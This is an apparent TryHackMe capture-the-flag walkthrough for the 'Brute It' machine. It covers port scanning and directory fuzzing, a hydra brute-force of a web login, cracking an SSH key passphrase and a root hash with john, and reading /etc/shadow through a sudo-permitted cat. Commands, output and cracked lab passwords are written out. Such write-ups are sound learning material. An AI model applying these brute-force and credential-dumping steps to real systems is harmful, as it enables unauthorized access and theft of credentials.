# Brute It
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* Bruteforcing
* John
* SSH
* Sudoers
* Shadow file

Tools used
--
* nmap
* ffuf
* hydra
* ssh2john
* john
* ssh
* sudo -l

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.13.25
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.13.25 -p- -T5 -vvv

<SNIP>
Discovered open port 80/tcp on 10.10.13.25
Discovered open port 22/tcp on 10.10.13.25
<SNIP>
```
Let's fuzz the web service:
```
ffuf -u http://10.10.13.25/FFUF -H 'Host: 10.10.13.25' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; r
v:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -
H 'DNT: 1' -H 'Sec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 79ms]
```
In the source code of this page, there is the following comment:
```
<!-- Hey john, if you do not remember, the username is admin -->
```

## Phase 2: Foothoold

Let's bruteforce the web application login by:
```
hydra -l admin -P $SECLISTS/Passwords/Leaked-Databases/rockyou.txt 10.10.13.25 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid"

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.13.25:80/admin/:user=^USER^&pass=^PASS^:F=invalid
[80][http-post-form] host: 10.10.13.25   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
```
By login, we land in a page with a RSA key to be downloaded. It is protected so, after download, we must crack its passphrase:
```
/usr/bin/ssh2john id_rsa > id.hash

john id.hash --wordlist=$SECLISTS/Passwords/Leaked-Databases/rockyou.txt

rockinroll       (id_rsa)
```
Let's login by SSH:
```
ssh -i id_rsa 10.10.13.25 -l john

Enter passphrase for key 'id_rsa':  rockinroll

cat user.txt
```
We got user flag.

## Phase 3: Privilege Escalation

Run:
```
sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
The exercise asks also for finding the root password. Let's retrieve it:
```
sudo /bin/cat /etc/shadow

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
<SNIP>
```
Let's crack it:
```
john hash.hash --format=sha512crypt -w $SECLISTS/Passwords/Leaked-Databases/rockyou.txt
<SNIP>
football         (root)
<SNIP>
```
Finally, get the root flag by `sudo /bin/cat /root/root.txt`.